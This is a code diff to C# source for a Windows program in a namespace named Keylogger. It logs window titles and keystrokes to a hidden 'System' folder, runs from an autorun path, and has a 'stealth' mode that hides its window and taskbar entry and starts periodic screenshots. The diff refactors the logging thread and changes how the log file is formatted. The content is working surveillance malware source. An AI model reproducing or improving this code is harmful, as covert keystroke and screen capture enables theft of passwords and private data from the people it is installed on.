@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
 using System.Windows;
@@ -18,21 +17,7 @@ using System.IO.Compression;
 
 namespace Keylogger
 {
-    public static class FileExtensions
-    {
-        public static IEnumerable<FileSystemInfo> AllFilesAndFolders(this DirectoryInfo dir)
-        {
-            foreach (var f in dir.GetFiles())
-                yield return f;
-            foreach (var d in dir.GetDirectories())
-            {
-                yield return d;
-                foreach (var o in AllFilesAndFolders(d))
-                    yield return o;
-            }
-        }
-    }
-
+    
     public partial class MainWindow : Window
     {
         #region WinAPI
@@ -120,12 +105,7 @@ namespace Keylogger
 
         private void CreateDir()
         {
-            //if (File.Exists(AutoRun.Path() + "System.zip"))
-            //{
-            //    File.Delete(AutoRun.Path() + "System.zip");
-            //    MessageBox.Show("ZIP DELETED");
-            //}
-        if (!Directory.Exists(AutoRun.Path + "\\System"))
+            if (!Directory.Exists(AutoRun.Path + "\\System"))
             {
                 DirectoryInfo di = Directory.CreateDirectory(AutoRun.Path + "\\System");
             }
@@ -136,25 +116,41 @@ namespace Keylogger
         {
             new Thread(() =>
             {
-                if (IsWindowChanged())
+                m.WaitOne();
+                try
                 {
-                    m.WaitOne();
-                    try
-                    {
-                        CreateDir();
-                        StreamWriter SW = new StreamWriter(AutoRun.Path+"\\System\\" + "Key.txt", true);
-                        datatime = DateTime.Now.ToString();
-                        SW.WriteLine();
-                        SW.WriteLine(datatime + "\t" + winTitle);
-                        SW.Close();
+                    using (StreamWriter SW = new StreamWriter(AutoRun.Path + "\\System\\" + "Key.txt", true))
+                    {                        
+                        if (IsWindowChanged())
+                        {
+                            try
+                            {
+                                CreateDir();
+                                datatime = DateTime.Now.ToString();
+                                SW.WriteLine();
+                                SW.WriteLine(datatime + "\t" + winTitle);                                
+                                
+                            }
+                            catch (IOException) { }
+                            finally
+                            {
+                                SW.Close();
+                            }
+                        }
+                        else
+                        {
+                            SW.Write(" ");
+                            SW.Close();
+                        }
                     }
-                    catch { }
-                    finally
-                    {
-                        m.ReleaseMutex();
-                    }
-
                 }
+
+                catch { }
+                finally
+                {                   
+                    m.ReleaseMutex();
+                }
+                
             }).Start();
 
         }
@@ -278,9 +274,9 @@ namespace Keylogger
                             SW.WriteLine();
 
                         }
-                        if (nextline >= 70)
+                        if (nextline >= 100)
                         {
-                            SW.WriteLine();
+                            SW.WriteLine("\t\t\t");
                             nextline = 0;
                         }
 
@@ -292,7 +288,7 @@ namespace Keylogger
                                 SW.Write(" ");
                             if (e.KeyCode == System.Windows.Forms.Keys.Return)
                             {
-                                SW.WriteLine();
+                                SW.WriteLine("\t\t\t");
                                 nextline = -1;
                             }
                             if (e.KeyCode == System.Windows.Forms.Keys.Multiply)
@@ -750,7 +746,6 @@ namespace Keylogger
         private void Stealth_Checked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Hidden;
-            // Hide();
             ShowInTaskbar = false;
             KeysLoad();
             timerScreen.Start();
